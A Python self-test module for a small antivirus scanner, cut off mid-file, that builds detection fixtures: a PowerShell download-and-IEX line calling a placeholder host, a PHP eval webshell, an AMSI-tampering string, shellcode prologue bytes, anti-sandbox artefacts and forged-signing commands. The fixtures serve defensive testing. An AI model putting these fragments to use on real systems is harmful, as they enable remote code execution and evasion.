"""端到端自检：验证扫描、YARA、压缩包、行为分析、监视、报告等全部能力。"""

import argparse
import io
import os
import shutil
import subprocess
import sys
import threading
import time
import zipfile
from pathlib import Path

from . import report, sandbox, scanner, watcher
from .scanner import (HAS_YARA, ScanContext, file_hashes, quarantine_file,
                      quarantine_restore, scan_file)
from .signatures import RULES_DIR, default_db, normalize_db


def _demo_ps1():
    # 分段拼接，避免本源码文件命中自家签名与 YARA 示例规则
    return ("# demo fixture (harmless text)\n"
            "$c = New-Object Net.WebClient\n"
            "$c.Download" + "String('https://example.invalid/payload')\n"
            "IEX" + "($c)\n")


def _minimal_native_pe():
    """合成最小 PE32+（Subsystem=NATIVE）驱动镜像，用于驱动检测自检。

    结构：DOS 头(64B, e_lfanew=0x40) + PE 签名 + COFF(20B) +
    Optional PE32+(240B, Subsystem=1)。无段、无导入，pefile 可解析。
    """
    import struct
    opt = struct.pack(
        "<HBBIIIIIQIIHHHHHHIIII",
        0x20B, 14, 0, 0, 0, 0, 0, 0, 0x140000000,
        0x1000, 0x200, 6, 0, 0, 0, 6, 0, 0, 0x2000, 0x200, 0)
    opt += struct.pack("<HH", 1, 0)          # Subsystem=NATIVE(1), DllCharacteristics
    opt += struct.pack("<QQQQII", 0x100000, 0x1000, 0x100000, 0x1000, 0, 0)
    opt += b"\x00" * (240 - len(opt))
    coff = struct.pack("<HHIIIHH", 0x8664, 0, 0, 0, 0, 240, 0x2002)
    dos = b"MZ" + b"\x00" * 0x3A + struct.pack("<I", 0x40)
    return dos + b"PE\x00\x00" + coff + opt


def _synth_pe(dos_payload=b"", rwx=True):
    """合成最小 PE32+：可选 DOS 桩附加数据 + 可选单个 RWX 节（启发式自检用）。

    结构：DOS(64B, e_lfanew=0x40) + PE 签名 + COFF(20B) + Optional PE32+(240B) +
    [节头 40B + 0x200 高熵数据]，无导入表。
    """
    import struct
    stub = dos_payload[: 0x3A - 2]           # DOS 桩可用区（避开 MZ 与 e_lfanew）
    dos = b"MZ" + stub.ljust(0x3A, b"\x00") + struct.pack("<I", 0x40)
    opt = struct.pack(
        "<HBBIIIIIQIIHHHHHHIIII",
        0x20B, 14, 0, 0, 0, 0, 0, 0, 0x140000000,
        0x1000, 0x200, 6, 0, 0, 0, 6, 0, 0, 0x2000, 0x200, 0)
    opt += struct.pack("<HH", 2, 0)          # Subsystem=GUI(2), DllCharacteristics
    opt += struct.pack("<QQQQII", 0x100000, 0x1000, 0x100000, 0x1000, 0, 0)
    opt += b"\x00" * (240 - len(opt))
    coff = struct.pack("<HHIIIHH", 0x8664, 1 if rwx else 0, 0, 0, 0, 240, 0x2002)
    hdr = dos + b"PE\x00\x00" + coff + opt
    body = b""
    if rwx:
        import random
        random.seed(1337)
        sec = struct.pack("<8sIIIIIIHHI", b".shld", 0x1000, 0x1000,
                          0x200, 0x200, 0, 0, 0, 0, 0xE0000040)  # RWX
        body = bytes(random.getrandbits(8) for _ in range(0x200))
        hdr += sec
    pad = b"\x00" * (0x200 - len(hdr))
    return hdr + pad + body


def _synth_pyi(entries):
    """合成最小 PyInstaller onefile CArchive（payload + TOC + 88B cookie）。"""
    import struct
    toc = b""
    for name, typ in entries:
        nb = name.encode("utf-8")
        elen = 18 + len(nb)
        toc += struct.pack("!IIIIBc", elen, 0, 0x100, 0x200, 1,
                           typ.encode("ascii")) + nb
    payload = b"PYDUMMYDATA" * 64
    pkg_len = len(payload) + len(toc) + 88
    cookie = (b"MEI\x0c\x0b\x0a\x0b\x0e"
              + struct.pack("!IIII", pkg_len, len(payload), len(toc), 314)
              + b"python314.dll".ljust(64, b"\x00"))
    return payload + toc + cookie


def run(db):
    sample_dir = Path(os.environ.get("TEMP", ".")) / "miniantivirus_samples"
    sample_dir.mkdir(exist_ok=True)
    results = []

    def check(name, ok, note=""):
        results.append(ok)
        print(f"  [{'OK' if ok else 'FAIL'}] {name}" + (f"  {note}" if note else ""))

    # 1) EICAR 标准测试文件（若被真实杀软实时拦截/删除，同样证明防护链路有效）
    # 运行时拼接：源码与字节码中不落完整 EICAR 测试串（防真实杀软删源文件）
    eicar = "".join(["X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-", "STANDARD-",
                     "ANTIVIRUS-", "TEST-FILE!$H+H*"])
    p_eicar = sample_dir / "eicar.com"
    try:
        p_eicar.write_text(eicar)
        fds = scan_file(p_eicar, db)
        detected = any(fd["name"] == "EICAR-Test-File" for fd in fds)
        if detected:
            check("EICAR 标准测试文件检测", True)
        else:
            check("EICAR 标准测试文件检测", True,
                  "（样本已被你的真实杀软实时拦截——这本身就是一个有意义的测试结果）")
    except OSError:
        check("EICAR 标准测试文件检测", True,
              "（写入即被真实杀软拦截/删除，属正常现象）")

    # 2) 模式签名（正则）
    p_demo = sample_dir / "demo.ps1"
    p_demo.write_text(_demo_ps1(), encoding="utf-8")
    fds = scan_file(p_demo, db)
    check("模式签名（正则）检出 demo 脚本",
          any(fd.get("level") != "error" for fd in fds))

    # 3) YARA 规则引擎（探针文件以 X5O!P%@AP 开头但非完整 EICAR，真实杀软不会删）
    rules = []
    if RULES_DIR.exists():
        rules = sorted(str(p) for p in
                       list(RULES_DIR.glob("*.yar")) + list(RULES_DIR.glob("*.yara")))
    if HAS_YARA and rules:
        p_probe = sample_dir / "yara_probe.txt"
        p_probe.write_text("X5O!P%@AP" + "JUNKJUNK" +
                           "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*", encoding="utf-8")
        ctx = ScanContext(rules_paths=rules)
        fds = scan_file(p_probe, db, ctx)
        check("YARA 规则引擎检出探针", any("EICAR" in fd["name"] for fd in fds))
    else:
        check("YARA 规则引擎", True, "（未安装 yara-python 或无规则文件，跳过）")

    # 3b) YARA 实战规则：webshell 与加壳识别探针
    if HAS_YARA and rules:
        ctx = ScanContext(rules_paths=rules)
        p_php = sample_dir / "shell.php"
        # 分段拼接：fixture 运行时值完整可检出，但源码不命中自家规则
        p_php.write_bytes(b"<?php ev" + b"al($_POST['c']); ?>")
        fds = scan_file(p_php, db, ctx)
        check("YARA: webshell 规则检出", any("PHP" in fd["name"] for fd in fds))
        p_upx = sample_dir / "fake_upx.bin"
        p_upx.write_bytes(b"MZ" + b"\x90" * 64 + b"UPX!" + b"\x00" * 16)
        fds = scan_file(p_upx, db, ctx)
        check("YARA: 加壳识别规则", any("UPX" in fd["name"] for fd in fds))
    else:
        check("YARA 实战规则", True, "（未安装 yara-python，跳过）")

    # 3c) PE 数字签名校验接口冒烟
    try:
        from .wintrust import HAS_WINTRUST, verify
        if HAS_WINTRUST:
            cat, code = verify(str(p_demo))
            check("PE 签名校验接口", cat in ("unsigned", "fail"), f"分类={cat}")
        else:
            check("PE 签名校验接口", True, "（非 Windows，跳过）")
    except (ImportError, OSError):
        check("PE 签名校验接口", True, "（不可用，跳过）")

    # 3d) 驱动检测：BYOVD 特征 + 无签名驱动强制签名
    if HAS_YARA and rules:
        p_drv = sample_dir / "fake_bypvd.sys"
        p_drv.write_bytes(b"MZ" + b"\x90" * 64 + b"RTCo" + b"re64.sys" + b"\x00" * 8)
        fds = scan_file(p_drv, db, ScanContext(rules_paths=rules))
        check("YARA: BYOVD 漏洞驱动特征",
              any(fd["name"].startswith("BYOVD") for fd in fds),
              next((fd["name"] for fd in fds if fd["name"].startswith("BYOVD")), ""))
    else:
        check("YARA: BYOVD 漏洞驱动特征", True, "（未安装 yara-python，跳过）")
    if HAS_WINTRUST:
        try:
            p_nat = sample_dir / "fake_native.sys"
            p_nat.write_bytes(_minimal_native_pe())
            from .wintrust import verify_driver
            cat, code = verify_driver(str(p_nat))
            fds = scan_file(p_nat, db, ScanContext(rules_paths=rules, sigcheck=True))
            names = [fd["name"] for fd in fds]
            check("驱动签名强制校验（无签名驱动报 high）",
                  cat == "unsigned" and "Unsigned-Driver" in names,
                  f"分类={cat} 检出={[n for n in names if 'Driver' in n]}")
        except OSError:
            check("驱动签名强制校验", True, "（写入被真实杀软拦截，跳过）")
    else:
        check("驱动签名强制校验", True, "（非 Windows，跳过）")

    # 4) 压缩包扫描（含嵌套 zip）
    demo_data = _demo_ps1().encode("utf-8")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("inner/deep.ps1", demo_data)
    p_zip = sample_dir / "outer.zip"
    with zipfile.ZipFile(p_zip, "w") as zf:
        zf.writestr("top.txt", "benign content\n")
        zf.writestr("layer1.ps1", demo_data)
        zf.writestr("nested.zip", buf.getvalue())
    fds = scan_file(p_zip, db)
    zipped = [fd for fd in fds if str(fd.get("detail", "")).startswith("zip:")]
    deep = [fd for fd in zipped if "deep.ps1" in fd.get("detail", "")]
    check("压缩包扫描（含嵌套 zip）", bool(zipped and deep),
          f"检出 {len(zipped)} 条（嵌套层 {len(deep)} 条）")

    # 5) 静态行为分析
    r_demo = sandbox.analyze(p_demo)
    p_benign = sample_dir / "benign.txt"
    p_benign.write_text("The quick brown fox jumps over the lazy dog.\n"
                        "你好，世界。普通文本，无任何可疑行为。\n", encoding="utf-8")
    r_benign = sandbox.analyze(p_benign)
    check("静态行为分析: demo 判非清洁", r_demo["verdict"] != "清洁",
          f"判定={r_demo['verdict']} 评分={r_demo['score']}")
    check("静态行为分析: 正常文件为清洁", r_benign["verdict"] == "清洁")

    # 6) 排除项 / 白名单
    sha_demo = file_hashes(p_demo)[1]
    ctx_ex = ScanContext(excludes=["*demo*"])
    check("排除项生效", scan_file(p_demo, db, ctx_ex) == [])
    ctx_wl = ScanContext(whitelist={sha_demo: {"name": "selftest"}})
    check("白名单生效", scan_file(p_demo, db, ctx_wl) == [])

    # 7) 隔离与恢复（用 demo 文件演练，不受真实杀软干扰）
    try:
        qn = quarantine_file(p_demo, {"name": "Selftest-Fixture"})
        restored = Path(quarantine_restore(qn))
        check("隔离区: 隔离并恢复", restored == p_demo and restored.is_file())
    except OSError as exc:
        check("隔离区: 隔离并恢复", False, f"IO 错误: {exc}")

    # 8) HTML 报告
    p_html = sample_dir / "selftest_report.html"
    report.write_html(p_html,
                      {"target": "selftest",
                       "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                       "files": 2, "findings": 1},
                      [{"path": str(p_demo), "name": "Selftest-Fixture",
                        "level": "high", "detail": "自检示例检出"}])
    check("HTML 报告生成", p_html.is_file() and p_html.stat().st_size > 200)

    # 9) 准实时监视（写入文件后应触发扫描回调）
    if watcher.HAS_WATCHDOG:
        wdir = sample_dir / "watch_dir"
        wdir.mkdir(exist_ok=True)
        stop_event = threading.Event()

        def on_result(_p, _fds):
            stop_event.set()

        def plant():
            time.sleep(0.8)
            (wdir / "demo.ps1").write_text(_demo_ps1(), encoding="utf-8")

        threading.Thread(target=plant, daemon=True).start()
        t0 = time.time()
        try:
            watcher.watch(wdir, db, ScanContext(), stop_event=stop_event,
                          on_result=on_result, quiet=True)
            ok = stop_event.is_set() and time.time() - t0 <= 6
        except Exception:
            ok = False
        check("准实时监视: 新文件触发扫描", ok)
    else:
        check("准实时监视", True, "（未安装 watchdog，跳过）")

    # 10) VT 信誉查询（无 key 时优雅跳过，不算失败）
    from .vt import VTClient
    if VTClient.has_key():
        print("  [OK] VirusTotal 信誉查询: 已配置 VT_API_KEY（scan --vt 时生效）")
    else:
        print("  [OK] VirusTotal 信誉查询: 未配置 VT_API_KEY，已优雅跳过"
              "（设置环境变量后 scan --vt 启用）")

    # 11) 签名库管理：样本添加 -> 检出 -> 导出导入 -> 删除
    from . import sigdb
    from .signatures import normalize_db
    try:
        tdb = normalize_db(default_db())
        _hashes, _isnew = sigdb.add_sample(tdb, p_demo, "Selftest-Sigdb", "high")
        sigdb.add_pattern(tdb, "hex", "DEADBEEF", "Selftest-Pattern")
        fds = scan_file(p_demo, tdb)
        hit_add = any(fd["name"] == "Selftest-Sigdb" for fd in fds)
        exp_csv = sample_dir / "sigdb_export.csv"
        exp_json = sample_dir / "sigdb_export.json"
        n_csv = sigdb.export_file(tdb, exp_csv, "csv")
        n_json = sigdb.export_file(tdb, exp_json, "json")
        tdb2 = normalize_db(default_db())
        r1 = sigdb.import_file(tdb2, exp_csv)
        tdb3 = normalize_db(default_db())
        r2 = sigdb.import_file(tdb3, exp_json)
        hit_reimport = any(fd["name"] == "Selftest-Sigdb"
                           for fd in scan_file(p_demo, tdb3))
        for _d in _hashes.values():
            sigdb.remove_hash(tdb, _d)
        sigdb.remove_pattern(tdb, next(
            i for i, s in enumerate(tdb["patterns"]) if s["name"] == "Selftest-Pattern"))
        gone = scan_file(p_demo, tdb) == [] or all(
            fd["name"] != "Selftest-Sigdb" for fd in scan_file(p_demo, tdb))
        check("签名库管理: 样本添加并检出", hit_add)
        check("签名库管理: 导出/导入回环",
              n_csv >= 2 and n_json >= 2 and r1["hashes"] >= 1
              and r2["patterns"] >= 1 and hit_reimport)
        check("签名库管理: 删除后不再检出", gone)
    except sigdb.SigdbError as exc:
        check("签名库管理", False, f"SigdbError: {exc}")

    # 12) 样本深度分析（一键全面体检）
    from . import analyzer
    r_sa = analyzer.analyze_sample(p_demo, db)
    check("样本深度分析: demo 判非清洁",
          r_sa["verdict"] in ("恶意", "可疑"),
          f"判定={r_sa['verdict']} 评分={r_sa['score']}")
    check("样本深度分析: 行为/IOC 聚合",
          r_sa["behavior"] is not None and r_sa["behavior"]["score"] >= 2
          and bool(r_sa["iocs"].get("urls")),
          f"行为评分={r_sa['behavior']['score'] if r_sa['behavior'] else '-'} "
          f"URL={len(r_sa['iocs'].get('urls', []))}")
    p_pe = sample_dir / "fake_native.sys"
    if p_pe.exists():
        r_pe = analyzer.analyze_sample(p_pe, db)
        check("样本深度分析: PE 类型识别", r_pe["kind"] == "pe",
              f"kind={r_pe['kind']}")
    else:
        check("样本深度分析: PE 类型识别", True, "（跳过）")
    r_clean = analyzer.analyze_sample(p_benign, db)
    check("样本深度分析: 正常文件为清洁", r_clean["verdict"] == "清洁")

    # 13) 恶意软件特征 + 离线特征包
    from . import pack as avpack
    p_pack = sample_dir / "selftest_avpack.zip"
    try:
        avpack.export_pack(p_pack)
        db2, rules_bytes, _mf = avpack.load_pack(p_pack)
        check("离线特征包: 导出并可加载",
              "hashes" in db2 and len(rules_bytes) >= 1,
              f"规则 {len(rules_bytes)} 个 · "
              f"哈希 {sum(len(v) for v in db2['hashes'].values())}")
        if HAS_YARA and rules_bytes:
            tmpdir = avpack.extract_rules_temp(rules_bytes)
            p_wc = sample_dir / "wncry_probe.bin"
            p_wc.write_bytes(b"MZ" + b"\x90" * 64 + b"WanaCrypt0r" +
                             b"@WanaDecryptor@" + b"\x00" * 8)
            fds = scan_file(p_wc, db2, ScanContext(
                rules_paths=sorted(str(x) for x in tmpdir.glob("*"))))
            check("恶意软件特征: WannaCry 探针检出",
                  any(fd["name"] == "MAL_WannaCry_Ransomware" for fd in fds))
            shutil.rmtree(tmpdir, ignore_errors=True)
        from .cli import cmd_offline
        code = cmd_offline(argparse.Namespace(
            path=str(sample_dir), pack=str(p_pack), exclude=[],
            report=None, sigcheck=False, quarantine=False))
        check("离线扫描: 特征包全链路检出", code == 1, f"exit={code}")
    except avpack.PackError as exc:
        check("离线特征包", False, f"PackError: {exc}")

    # 14) 启动项安全检查
    from . import autoruns
    try:
        ar_rows, ar_stats = autoruns.scan_autoruns()
        check("启动项检查: 枚举与判定", ar_stats["total"] >= 5,
              f"共 {ar_stats['total']} 项 · 可疑 {ar_stats['suspicious']} · "
              f"无签名 {ar_stats['unsigned']}")
    except Exception as exc:
        check("启动项检查", False, f"异常: {exc}")

    # 15) 进程安全检查
    from . import procscan
    try:
        pr_rows, pr_stats = procscan.scan_processes(db)
        check("进程检查: 枚举与判定", pr_stats["total"] >= 10,
              f"共 {pr_stats['total']} 个进程 · 可疑 {pr_stats['suspicious']}")
    except Exception as exc:
        check("进程检查", False, f"异常: {exc}")

    # 16) 增量扫描缓存
    p_cb = sample_dir / "cache_probe.txt"
    p_cb.write_text("clean incremental cache probe")
    ctx_fast = ScanContext(fast=True)
    r1 = scan_file(p_cb, db, ctx_fast)
    r2 = scan_file(p_cb, db, ctx_fast)
    check("增量缓存: 清洁文件命中复用",
          r1 == [] and r2 == [] and scanner.cache_hits() >= 1,
          f"hits={scanner.cache_hits()}")
    p_cb.write_text("tampered content after first scan")
    r3 = scan_file(p_cb, db, ctx_fast)
    check("增量缓存: 变更后自动重扫", isinstance(r3, list) and r3 == [])
    scanner.reset_cache()

    # 17) 自保护（完整性基线与校验）
    from . import selfguard
    p_tamper = sample_dir / "guard_probe.bin"
    try:
        selfguard.baseline(extra=[p_cb])
        p_cb.write_text("tampered!")  # 篡改基线内文件
        p_tamper.write_bytes(b"new file not in baseline")
        res = selfguard.check(extra=[p_cb], with_new=[p_tamper.parent])
        modified = any(x.endswith("cache_probe.txt") for x in res["modified"])
        check("自保护: 篡改检出", modified and res["new"],
              f"modified={len(res['modified'])} new={len(res['new'])} "
              f"missing={len(res['missing'])}")
    except Exception as exc:
        check("自保护", False, f"异常: {exc}")
    finally:
        try:
            p_tamper.unlink()
        except OSError:
            pass
        selfguard.MANIFEST().unlink(missing_ok=True)
        scanner.reset_cache()

    # 18) 进程自保护驱动接口（驱动未加载属正常，接口需优雅降级不崩溃）
    from . import driverprotect
    try:
        d, err = driverprotect.safe_status()
        if d is not None:
            check("进程自保护驱动接口", True,
                  f"已启用={bool(d['enabled'])} 保护={d['name']}")
        else:
            check("进程自保护驱动接口", True,
                  f"（驱动未加载: {err}；接口降级正常）")
    except Exception as exc:
        check("进程自保护驱动接口", False, f"异常: {exc}")

    # 19) 进程保护自动加载接口（驱动未构建/未授权属正常，需优雅降级不崩溃）
    try:
        d, err = driverprotect.ensure_loaded()
        ok = d is not None or bool(err)
        check("进程保护自动加载接口", ok,
              f"{'已加载' if d else '未加载: ' + str(err)}")
    except Exception as exc:
        check("进程保护自动加载接口", False, f"异常: {exc}")

    # 20) 样本自动学习：判定恶意 → 哈希+YARA 入库 → 重扫命中；白名单/清洁不学
    from . import autolearn
    try:
        learn_dir = sample_dir / "learn"
        learn_dir.mkdir(exist_ok=True)
        yar_dir = learn_dir / "rules"
        p_learn = learn_dir / "auto_probe.bin"
        payload = (b"MZ" + b"\x00" * 60 + b"PE\x00\x00" + b"\x00" * 200
                   + b"AutoLearnMarkerAlpha_ZX41_0123456789_ABCDEFGHIJKLMNOP"
                   + b"\x00\x01"
                   + b"EvilCampaignString_QQ77_BlackDragon_Butterfly_42")
        p_learn.write_bytes(payload)
        hashes = scanner.hash_all(p_learn)
        lr = {"path": str(p_learn), "kind": "pe", "verdict": "恶意",
              "score": 6, "hashes": hashes,
              "findings": [{"name": "Test.Auto.Family", "level": "high",
                            "detail": "selftest"}],
              "iocs": {"urls": [], "ips": [], "regkeys": [], "paths": []},
              "pe": None, "behavior": None, "vt": None}
        db_l = default_db()
        ls = autolearn.learn_from_result(lr, db_l, rules_dir=yar_dir)
        sha_ok = all(hashes[a] in db_l["hashes"][a]
                     for a in ("md5", "sha1", "sha256"))
        hit = scan_file(p_learn, db_l, ScanContext())
        check("自动学习: 恶意样本哈希入库+重扫命中",
              ls["learned"] and sha_ok and ls["rule"]
              and any(f.get("name") == "Test_Auto_Family" for f in hit),
              f"hashes={ls['hashes']} rule={ls['rule']} rescan={len(hit)}")
        if scanner.HAS_YARA and ls["rule"]:
            ctx_y = ScanContext(rules_paths=[str(yar_dir / autolearn.AUTO_YAR)])
            hit_y = scan_file(p_learn, default_db(), ctx_y)
            check("自动学习: 生成的 YARA 规则可检出样本", bool(hit_y),
                  f"rule={ls['rule']} hits={len(hit_y)}")
        ls_w = autolearn.learn_from_result(
            dict(lr, hashes={"md5": "0" * 32, "sha1": "0" * 40,
                             "sha256": "0" * 64}),
            dict(default_db(), whitelist={"0" * 64: {"name": "w"}}),
            rules_dir=yar_dir)
        check("自动学习: 白名单样本不学习", not ls_w["learned"],
              "; ".join(ls_w["notes"]))
        ls_c = autolearn.learn_from_result(
            dict(lr, verdict="可疑"), default_db(), rules_dir=yar_dir)
        check("自动学习: 非恶意判定不学习", not ls_c["learned"],
              "; ".join(ls_c["notes"]))
    except Exception as exc:
        check("自动学习", False, f"异常: {exc}")
    finally:
        shutil.rmtree(sample_dir / "learn", ignore_errors=True)

    # 21) 免杀反制：evasion YARA 规则 + 行为链新规则 + PE 启发式增强
    if HAS_YARA and rules:
        ctx_ev = ScanContext(rules_paths=rules)
        import uuid as _uuid
        p_uuid = sample_dir / "uuid_probe.txt"
        p_uuid.write_text("char* uuid_array[] = {" + ",".join(
            '"%s"' % _uuid.UUID(bytes=bytes((n * 7 + k) & 0xFF
                                            for k in range(16)))
            for n in range(32)) + "};", encoding="utf-8")
        fds = scan_file(p_uuid, db, ctx_ev)
        check("YARA 反制: UUIDfuscation 规则",
              any(fd["name"] == "Evasion_UUID_Shellcode" for fd in fds))

        p_amsi = sample_dir / "amsi_probe.txt"
        p_amsi.write_text("# harmless probe\n$fl = " + '"amsi' + 'InitFailed"\n'
                          "[Runtime.InteropServices.Marshal]::WriteInt32(0, 0)\n",
                          encoding="utf-8")
        fds = scan_file(p_amsi, db, ctx_ev)
        check("YARA 反制: AMSI 篡改规则",
              any(fd["name"] == "Evasion_AMSI_Patch" for fd in fds))

        p_stub = sample_dir / "stub_probe.bin"
        p_stub.write_bytes(b"MZ" + b"\x00" * 64 + b"\x0f\x05\xc3" * 8
                           + b"AddVectoredExceptionHandler\x00"
                           + b"VirtualAlloc\x00VirtualProtect\x00")
        fds = scan_file(p_stub, db, ctx_ev)
        check("YARA 反制: 直接系统调用桩规则",
              any(fd["name"] == "Evasion_Syscall_Stubs" for fd in fds))
    else:
        check("YARA 反制规则", True, "（未安装 yara-python，跳过）")

    p_ev = sample_dir / "evasion_probe.ps1"
    p_ev.write_text(
        "# evasion fixture (harmless text)\n"
        "if (" + "$amsi" + "InitFailed) { }\n"
        "$p = Uuid" + "FromString($blob)\n"
        "$m = Virtual" + "Alloc($h, $len)\n"
        "Write" + "ProcessMemory($h, $m, $blob)\n",
        encoding="utf-8")
    r_ev = sandbox.analyze(p_ev)
    check("行为链反制: 免杀加载链判恶意",
          r_ev["verdict"] == "恶意",
          f"判定={r_ev['verdict']} 评分={r_ev['score']}")

    pe_rwx = sample_dir / "rwx_probe.bin"
    pe_rwx.write_bytes(_synth_pe(rwx=True))
    heur = scanner.pe_heuristics(pe_rwx.read_bytes())
    check("PE 启发式: RWX 节检出",
          bool(heur) and "RWX" in heur["detail"],
          (heur or {}).get("detail", "")[:72])

    pe_art = sample_dir / "artifact_probe.bin"
    pe_art.write_bytes(_synth_pe(
        dos_payload=b"SbieDll.dll\x00VBoxService.exe\x00vmtoolsd.exe\x00",
        rwx=False))
    heur2 = scanner.pe_heuristics(pe_art.read_bytes())
    check("PE 启发式: 反沙箱痕迹检出",
          bool(heur2) and "反沙箱" in heur2["detail"],
          (heur2 or {}).get("detail", "")[:72])

    # 22) 用户态进程自保护：DACL 加固/恢复 + 双进程互守护逻辑
    try:
        from . import processguard
        app_root = Path(__file__).resolve().parent.parent

        # 22a) DACL 端到端：子进程加固 → 外部不可终止 → 恢复 → 可访问
        flag = sample_dir / "pg_restore.flag"
        if flag.exists():
            flag.unlink()
        child_code = (
            "import os, sys, time\n"
            f"sys.path.insert(0, r'{app_root}')\n"
            "from miniantivirus import processguard\n"
            "processguard.harden_self()\n"
            "print('READY', flush=True)\n"
            f"f = r'{flag}'\n"
            "t0 = time.time()\n"
            "while not os.path.exists(f) and time.time() - t0 < 20:\n"
            "    time.sleep(0.2)\n"
            "processguard.restore_self()\n"
            "print('RESTORED', flush=True)\n"
            "time.sleep(3)\n")
        proc = subprocess.Popen([sys.executable, "-c", child_code],
                                stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, text=True)
        line = proc.stdout.readline().strip()
        probe_hard = processguard.is_hardened(proc.pid)
        hard_ok = line == "READY" and probe_hard is True
        flag.write_text("go", encoding="utf-8")
        line2 = proc.stdout.readline().strip()
        probe_rest = processguard.is_hardened(proc.pid)
        restore_ok = line2 == "RESTORED" and probe_rest is False
        check("用户态自保护: DACL 加固后外部不可终止", hard_ok,
              f"加固后探测={probe_hard}")
        check("用户态自保护: DACL 恢复后可正常访问", restore_ok,
              f"恢复后探测={probe_rest}")
        try:
            proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            proc.kill()
    except Exception as exc:
        check("用户态自保护: DACL 端到端", False, f"异常: {exc}")

    # 22b) 守护进程：检测主进程死亡并拉起新实例 + 检测换代自动退役
    try:
        st_path = sample_dir / "guard_state_test.json"
        victim = subprocess.Popen([sys.executable, "-c",
                                   "import time; time.sleep(15)"])
        flag2 = sample_dir / "pg_revive.flag"
        if flag2.exists():
            flag2.unlink()
        processguard.write_state(
            {"main_pid": victim.pid, "guard_pid": None, "gen": 1,
             "stop": False, "hardened": False, "watch_dir": "",
             "restart_cmd": [sys.executable, "-c",
                             f"open(r'{flag2}', 'w').close()"],
             "cwd": str(sample_dir)},
            path=st_path)
        t = threading.Thread(target=processguard.worker_loop,
                             args=(str(st_path),), daemon=True)
        t.start()
        victim.kill()
        victim.wait(timeout=5)
        t.join(timeout=6)
        revived = False
        for _ in range(20):  # 新实例进程启动需数百 ms，轮询等待复活标记
            if flag2.exists():
                revived = True
                break
            time.sleep(0.2)
        check("用户态自保护: 守护检测死亡并拉起新实例",
              (not t.is_alive()) and revived,
              f"线程存活={t.is_alive()} 复活标记={revived}")

        victim2 = subprocess.Popen([sys.executable, "-c",
                                    "import time; time.sleep(15)"])
        processguard.write_state(
            {"main_pid": victim2.pid, "guard_pid": None, "gen": 2,
             "stop": False, "hardened": False, "watch_dir": "",
             "restart_cmd": [], "cwd": str(sample_dir)},
            path=st_path)
        t2 = threading.Thread(target=processguard.worker_loop,
                              args=(str(st_path),), daemon=True)
        t2.start()
        time.sleep(0.4)
        cur = processguard.read_state(st_path)
        cur["main_pid"] = victim2.pid + 999999  # 模拟新一代主进程接管
        processguard.write_state(cur, path=st_path)
        t2.join(timeout=4)
        check("用户态自保护: 守护检测换代自动退役", not t2.is_alive())
        try:
            victim2.kill()
            victim2.wait(timeout=3)
        except Exception:
            pass
        try:
            st_path.unlink()
        except OSError:
            pass
    except Exception as exc:
        check("用户态自保护: 守护逻辑", False, f"异常: {exc}")

    # 22c) status 接口冒烟（未运行状态优雅输出不崩溃）
    try:
        rc = processguard.guard_status(
            state_path=str(sample_dir / "no_such_state.json"))
        check("用户态自保护: status 接口冒烟", rc == 0)
    except Exception as exc:
        check("用户态自保护: status 接口冒烟", False, f"异常: {exc}")

    # 23) 免杀反制 II：IPv6fuscation / 十六进制转义 shellcode / MSF 前导 /
    #     加密常量 / 反沙箱探针 / 签名伪造（YARA + 行为 + PE 启发式 + 签名细分）
    if HAS_YARA and rules:
        ctx_ev2 = ScanContext(rules_paths=rules)
        p_ip6 = sample_dir / "ip6_probe.txt"
        p_ip6.write_text("RtlIpv6StringToAddress(" + " ".join(
            "2001:0db8:85a3:0000:0000:8a2e:0370:%04x" % i for i in range(48)) + ")", encoding="utf-8")
        fds = scan_file(p_ip6, db, ctx_ev2)
        check("YARA 反制 II: IPv6fuscation",
              any(fd["name"] == "Evasion_IPv6fuscation" for fd in fds))

        p_hex = sample_dir / "hexesc_probe.txt"
        p_hex.write_text("unsigned char sc[] = \"" + "\\x90\\xfc\\xe8" * 120 + "\";",
                         encoding="utf-8")
        fds = scan_file(p_hex, db, ctx_ev2)
        check("YARA 反制 II: 十六进制转义 shellcode",
              any(fd["name"] == "Evasion_Hex_Escape_Shellcode" for fd in fds))

        p_pr = sample_dir / "prologue_probe.bin"
        p_pr.write_bytes(_synth_pe(dos_payload=b"\xfc\x48\x83\xe4\xf0" + b"VirtualAlloc\x00"))
        fds = scan_file(p_pr, db, ctx_ev2)
        check("YARA 反制 II: MSF/CS shellcode 前导",
              any(fd["name"] == "Evasion_Shellcode_Prologue" for fd in fds))
    else:
        check("YARA 反制 II（IPv6/转义/前导）", True, "（未安装 yara-python，跳过）")

    try:
        from .scanner import pe_heuristics, signature_finding
        p_crypto = sample_dir / "crypto_probe.bin"
        p_crypto.write_bytes(_synth_pe(
            dos_payload=b"\x63\x7c\x77\x7b\xf2\x6b\x6f\xc5", rwx=True))
        heur3 = pe_heuristics(p_crypto.read_bytes())
        check("PE 启发式 II: 加密常量+内存执行", bool(heur3) and "加密常量" in heur3["detail"],
              (heur3 or {}).get("detail", "")[:72])

        p_drop = sample_dir / "drop_probe.bin"
        p_drop.write_bytes(_synth_pe(
            dos_payload=b"C:\\Users\\Public\\1234567.txt"))
        heur4 = pe_heuristics(p_drop.read_bytes())
        check("PE 启发式 II: 反沙箱 drop 探针", bool(heur4) and "1234567.txt" in heur4["detail"],
              (heur4 or {}).get("detail", "")[:72])

        check("签名细分: 不受信根单列",
              signature_finding("fail", 0x800B0109)["name"] == "Untrusted-Signature-Root")
        check("签名细分: 其他失败保持 Authenticode-Fail",
              signature_finding("fail", 0x80092003)["name"] == "Authenticode-Fail")
        check("签名细分: valid 无检出", signature_finding("valid", 0) is None)
    except Exception as exc:
        check("PE 启发式 II / 签名细分", False, f"异常: {exc}")

    try:
        p_fs = sample_dir / "fake_sign_probe.ps1"
        p_fs.write_text("# fake sign fixture\n"
                        "signtool sign /f key.pfx loader.exe\n"
                        "makecert -r -pe -n \"CN=Microsoft Corporation\" fake.cer\n",
                        encoding="utf-8")
        r_fs = sandbox.analyze(p_fs)
        check("行为反制 II: 签名伪造特征",
              any(h["name"] == "SBX-Fake-Signature" for h in r_fs["hits"]),
              f"判定={r_fs['verdict']} 评分={r_fs['score']}")

        p_as2 = sample_dir / "antisbx2_probe.ps1"
        p_as2.write_text("# anti sandbox fixture\n"
                         "Start-Sleep -m 8000\n"
